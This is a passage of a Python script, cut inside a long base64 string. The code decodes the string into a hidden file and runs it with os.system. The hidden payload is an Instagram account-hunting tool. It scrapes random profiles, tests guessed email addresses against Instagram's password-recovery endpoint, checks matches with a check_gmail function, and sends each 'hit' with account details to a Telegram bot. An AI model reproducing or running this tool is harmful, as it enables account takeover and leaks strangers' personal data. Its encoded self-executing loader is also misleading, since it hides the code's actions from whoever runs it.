hbmRyb2lkLScKICAgIGRldmljZV9pZCA9IGRldiArIGhhc2hsaWIubWQ1KHN0cih1dWlkLnV1aWQ0KCkpLmVuY29kZSgpKS5oZXhkaWdlc3QoKVs6MTZdCiAgICB1dWkgPSBzdHIodXVpZC51dWlkNCgpKQogICAgaGVhZGVycyA9IHsKICAgICAgICBVU0VSX0FHRU5UX0hFQURFUjogdWEsCiAgICAgICAgQ09PS0lFX0hFQURFUjogQ09PS0lFX1ZBTFVFLAogICAgICAgIENPTlRFTlRfVFlQRV9IRUFERVI6IENPTlRFTlRfVFlQRV9GT1JNCiAgICB9CiAgICBkYXRhID0gewogICAgICAgIFNJR05FRF9CT0RZOiAoJzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwMjAxMmZiMGEzMjliY2FmYjNiMWY0YzBiYjU2YjFmMWYuJyArCiAgICAgICAgICAgICAgICAgICAgICBqc29uLmR1bXBzKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAnX2NzcmZ0b2tlbic6ICc5eTNONWtMcXppYWxRQTd6OTZBTWl5QUtMTUJXcHFWaicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkaWQnOiB1dWksCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ2d1aWQnOiB1dWksCiAgICAgICAgICAgICAgICAgICAgICAgICAgJ2RldmljZV9pZCc6IGRldmljZV9pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAncXVlcnknOiBlbWFpbAogICAgICAgICAgICAgICAgICAgICAgfSkpLAogICAgICAgIElHX1NJR19LRVlfVkVSU0lPTjogJzQnCiAgICB9CiAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoSU5TVEFHUkFNX1JFQ09WRVJZX1VSTCwgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEpLnRleHQKICAgIGlmIGVtYWlsIGluIHJlc3BvbnNlOgogICAgICAgIGlmIGVpem9uX2RvbWFpbiBpbiBlbWFpbDoKICAgICAgICAgICAgY2hlY2tfZ21haWwoZW1haWwpCiAgICAgICAgZ29vZF9pZyArPSAxCiAgICAgICAgdXBkYXRlX3N0YXRzKCkKICAgIGVsc2U6CiAgICAgICAgYmFkX2luc3RhICs9IDEKICAgICAgICB1cGRhdGVfc3RhdHMoKQoKZGVmIHJlc3QodXNlcik6CiAgICB0cnk6CiAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgJ1gtUGlnZW9uLVNlc3Npb24tSWQnOiAnNTBjYzY4NjEtNzAzNi00M2I0LTgwMmUtZmI0MjgyNzk5YzYwJywKICAgICAgICAgICAgJ1gtUGlnZW9uLVJhd2NsaWVudHRpbWUnOiAnMTcwMDI1MTU3NC45ODInLAogICAgICAgICAgICAnWC1JRy1Db25uZWN0aW9uLVNwZWVkJzogJy0xa2JwcycsCiAgICAgICAgICAgICdYLUlHLUJhbmR3aWR0aC1TcGVlZC1LQlBTJzogJy0xLjAwMCcsCiAgICAgICAgICAgICdYLUlHLUJhbmR3aWR0aC1Ub3RhbEJ5dGVzLUInOiAnMCcsCiAgICAgICAgICAgICdYLUlHLUJhbmR3aWR0aC1Ub3RhbFRpbWUtTVMnOiAnMCcsCiAgICAgICAgICAgICdYLUJsb2tzLVZlcnNpb24tSWQnOiAoJ2M4MGM1ZmIzMGRmYWU5ZTI3M2U0MDA5ZjAzYjE4MjgwJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdiYjM0M2IwODYyZDY2M2YzMWEzYzYzZjEzYTlmMzFjMCcpLAogICAgICAgICAgICAnWC1JRy1Db25uZWN0aW9uLVR5cGUnOiAnV0lGSScsCiAgICAgICAgICAgICdYLUlHLUNhcGFiaWxpdGllcyc6ICczYnJUdnc9PScsCiAgICAgICAgICAgICdYLUlHLUFwcC1JRCc6ICc1NjcwNjczNDMzNTI0MjcnLAogICAgICAgICAgICBVU0VSX0FHRU5UX0hFQURFUjogKCdJbnN0YWdyYW0gMTAwLjAuMC4xNy4xMjkgQW5kcm9pZCAoMjkvMTA7IDQyMGRwaTsgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICcxMDgweDIxMjk7IHNhbXN1bmc7IFNNLU0yMDVGOyBtMjBsdGU7IGV4eW5vczc5MDQ7ICcKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZW5fR0I7IDE2MTQ3ODY2NCknKSwKICAgICAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1HQiwgZW4tVVMnLAogICAgICAgICAgICBDT09LSUVfSEVBREVSOiBDT09LSUVfVkFMVUUsCiAgICAgICAgICAgIENPTlRFTlRfVFlQRV9IRUFERVI6IENPTlRFTlRfVFlQRV9GT1JNLAogICAgICAgICAgICAnQWNjZXB0LUVuY29kaW5nJzogJ2d6aXAsIGRlZmxhdGUnLAogICAgICAgICAgICAnSG9zdCc6ICdpLmluc3RhZ3JhbS5jb20nLAogICAgICAgICAgICAnWC1GQi1IVFRQLUVuZ2luZSc6ICdMaWdlcicsCiAgICAgICAgICAgICdDb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAogICAgICAgICAgICAnQ29udGVudC1MZW5ndGgnOiAnMzU2JwogICAgICAgIH0KICAgICAgICBkYXRhID0gewogICAgICAgICAgICBTSUdORURfQk9EWTogKCcwZDA2N2MyZjg2Y2FjMmMxN2Q2NTU2MzFjOWNlYzI0MDIwMTJmYjBhMzI5YmNhZmIzYjFmNGMwYmI1NmIxZjFmLicKICAgICAgICAgICAgICAgICAgICAgICAgICAneyJfY3NyZnRva2VuIjoiOXkzTjVrTHF6aWFsUUE3ejk2QU1peUFLTE1CV3BxVmoiLCcKICAgICAgICAgICAgICAgICAgICAgICAgICAnImFkaWQiOiIwZGZhZjgyMC0yNzQ4LTQ2MzQtOTM2NS1jM2Q4YzgwMTEyNTYiLCcKICAgICAgICAgICAgICAgICAgICAgICAgICAnImd1aWQiOiIxZjc4NDQzMS0yNjYzLTRkYjktYjYyNC04NmJkOWNlMWQwODQiLCcKICAgICAgICAgICAgICAgICAgICAgICAgICAnImRldmljZV9pZCI6ImFuZHJvaWQtYjkzZGRiMzdlOTgzNDgxYyIsJwogICAgICAgICAgICAgICAgICAgICAgICAgICcicXVlcnkiOiInICsgdXNlciArICcifScpLAogICAgICAgICAgICBJR19TSUdfS0VZX1ZFUlNJT046ICc0JwogICAgICAgIH0KICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoSU5TVEFHUkFNX1JFQ09WRVJZX1VSTCwgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEpLmpzb24oKQogICAgICAgIGVpem9ucG9ybm8gPSByZXNwb25zZS5nZXQoJ2VtYWlsJywgJ1Jlc2V0IE5vbmUnKQogICAgZXhjZXB0OgogICAgICAgIGVpem9ucG9ybm8gPSAnUmVzZXQgTm9uZScKICAgIHJldHVybiBlaXpvbnBvcm5vCgpkZWYgZGF0ZShoeSk6CiAgICB0cnk6CiAgICAgICAgcmFuZ2VzID0gWwogICAgICAgICAgICAoMTI3OTAwMCwgMjAxMCksCiAgICAgICAgICAgICgxNzc1MDAwMCwgMjAxMSksCiAgICAgICAgICAgICgyNzk3NjAwMDAsIDIwMTIpLAogICAgICAgICAgICAoOTAwOTkwMDAwLCAyMDEzKSwKICAgICAgICAgICAgKDE2MjkwMTAwMDAsIDIwMTQpLAogICAgICAgICAgICAoMjUwMDAwMDAwMCwgMjAxNSksCiAgICAgICAgICAgICgzNzEzNjY4Nzg2LCAyMDE2KSwKICAgICAgICAgICAgKDU2OTk3ODUyMTcsIDIwMTcpLAogICAgICAgICAgICAoODU5NzkzOTI0NSwgMjAxOCksCiAgICAgICAgICAgICgyMTI1NDAyOTgzNCwgMjAxOSksCiAgICAgICAgXQogICAgICAgIGZvciB1cHBlciwgeWVhciBpbiByYW5nZXM6CiAgICAgICAgICAgIGlmIGh5IDw9IHVwcGVyOgogICAgICAgICAgICAgICAgcmV0dXJuIHllYXIKICAgICAgICByZXR1cm4gMjAyMwogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCgpkZWYgSW5mb0FjYyh1c2VybmFtZSwgZG9tYWluKToKICAgIGdsb2JhbCB0b3RhbF9oaXRzCiAgICBhY2NvdW50X2luZm8gPSBpbmZvaW5zdGEuZ2V0KHVzZXJuYW1lLCB7fSkKICAgIHVzZXJfaWQgPSBhY2NvdW50X2luZm8uZ2V0KCdwaycpCiAgICBmdWxsX25hbWUgPSBhY2NvdW50X2luZm8uZ2V0KCdmdWxsX25hbWUnKQogICAgZm9sbG93ZXJzID0gYWNjb3VudF9pbmZvLmdldCgnZm9sbG93ZXJfY291bnQnKQogICAgZm9sbG93aW5nID0gYWNjb3VudF9pbmZvLmdldCgnZm9sbG93aW5nX2NvdW50JykKICAgIHBvc3RzID0gYWNjb3VudF9pbmZvLmdldCgnbWVkaWFfY291bnQnKQogICAgYmlvID0gYWNjb3VudF9pbmZvLmdldCgnYmlvZ3JhcGh5JykKICAgIHRvdGFsX2hpdHMgKz0gMQogICAgaW5mb190ZXh0ID0gZiIiIgrwn5OIIPCdl5zwnZeh8J2XpvCdl6fwnZeU8J2XmvCdl6XwnZeU8J2XoCDwnZeb8J2XnPCdl6cg8J+SsArwk4ap8JOGqvCThqnwk4aq8JOGqfCThqrwk4ap8JOGqvCThqnwk4aq8JOGqfCThqrwk4ap8JOGqvCThqnwk4aq8JOGqfCThqoK8J+UpSDwnZmD8J2ZnvCdmakgOiBbIHt0b3RhbF9oaXRzfSBdCvCfkaQg8J2ZkPCdmajwnZma8J2ZpyA6IFsgQHt1c2VybmFtZX0gXQrwn5OnIPCdmYDwnZmi8J2ZlvCdmZ7wnZmhIDogWyB7dXNlcm5hbWV9QHtkb21haW59IF0K8J+RpSDwnZmB8J2ZpPCdmaHwnZmh8J2ZpPCdmazwnZma8J2Zp/CdmaggOiBbIHtmb2xsb3dlcnN9IF0g8J+Rogrwn6uCIPCdmYHwnZmk8J2ZofCdmaHwnZmk8J2ZrPCdmZ7wnZmj8J2ZnCA6IFsge2ZvbGxvd2luZ30gXSDwn46vCvCfk7gg8J2Zi/CdmaTwnZmo8J2ZqfCdmaggOiBbIHtwb3N0c30gXSDwn5a877iPCvCfk4Ug8J2Yv/CdmZbwnZmp8J2ZmiA6IFsgPyBdIOKPswrwn5OdIPCdmL3wnZme8J2ZpCA6IFsge2Jpb30gXSDinI3vuI8K8J+UkyDwnZmN8J2ZmvCdmajwnZmpIDogWyB7cmVzdCh1c2VybmFtZSl9IF0g8J+Xne+4jwrwk4ap8JOGqvCThqnwk4aq8JOGqfCThqrwk4ap8JOGqvCThqnwk4aq8JOGqfCThqrwk4ap8JOGqvCThqnwk4aq8JOGqfCThqoK4pqhIFsg8J2Xp/Cdl7zwnZe88J2XuSDwnZeV8J2YhiB+IEBQeW9ic2N1cmEgIF0KIiIiCiAgICB3aXRoIG9wZW4oJ2hpdHMudHh0JywgJ2EnKSBhcyBmOgogICAgICAgIGYud3JpdGUoaW5mb190ZXh0ICsgIlxuIikKICAgIHRyeToKICAgICAgICByZXF1ZXN0cy5nZXQoZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPS0VOfS9zZW5kTWVzc2FnZT9jaGF0X2lkPXtpbnB1dF9pZH0mdGV4dD17aW5mb190ZXh0fSIpCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHBhc3MKCmRlZiBlaXpvbl9weXRob24oKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZGF0YSA9IHsKICAgICAgICAgICAgJ2xzZCc6ICcnLmpvaW4ocmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xldHRlcnMgKyBzdHJpbmcuZGlnaXRzLCBrPTMyKSksCiAgICAgICAgICAgICd2YXJpYWJsZXMnOiBqc29uLmR1bXBzKHsKICAgICAgICAgICAgICAgICdpZCc6IGludChyYW5kb20ucmFuZHJhbmdlKDI2NjAyODkxNiwgMTkwMDAwMDAwMCkpLAogICAgICAgICAgICAgICAgJ3JlbmRlcl9zdXJmYWNlJzogJ1BST0ZJTEUnCiAgICAgICAgICAgIH0pLAogICAgICAgICAgICAnZG9jX2lkJzogJzI1NjE4MjYxODQxMTUwODQwJwogICAgICAgIH0KICAgICAgICBoZWFkZXJzID0geydYLUZCLUxTRCc6IGRhdGFbJ2xzZCddfQogICAgICAgIHRyeToKICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FwaS9ncmFwaHFsJywgaGVhZGVycz1oZWFkZXJzLCBkYXRhPWRhdGEpCiAgICAgICAgICAgIGFjY291bnQgPSByZXNwb25zZS5qc29uKCkuZ2V0KCdkYXRhJywge30pLmdldCgndXNlcicsIHt9KQogICAgICAgICAgICB1c2VybmFtZSA9IGFjY291bnQuZ2V0KCd1c2VybmFtZScpCiAgICAgICAgICAgIGlmIHVzZXJuYW1lOgogICAgICAgICAgICAgICAgaW5mb2luc3RhW3VzZXJuYW1lXSA9IGFjY291bnQKICAgICAgICAgICAgICAgIGVtYWlscyA9IFt1c2VybmFtZSArIGVpem9uX2RvbWFpbl0KICAgICAgICAgICAgICAgIGZvciBlbWFpbCBpbiBlbWFpbHM6CiAgICAgICAgICAgICAgICAgICAgY2hlY2soZW1haWwpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgcGFzcwoKZm9yIF8gaW4gcmFuZ2UoODApOgogICAgVGhyZWFkKHRhcmdldD1laXpvbl9weXRob24pLnN0YXJ0KCkK')

try:
    with open(file_name, 'wb') as file:
        file.write(source)
    os.system('python .encrypted')
except Exception as e:
    print(e)
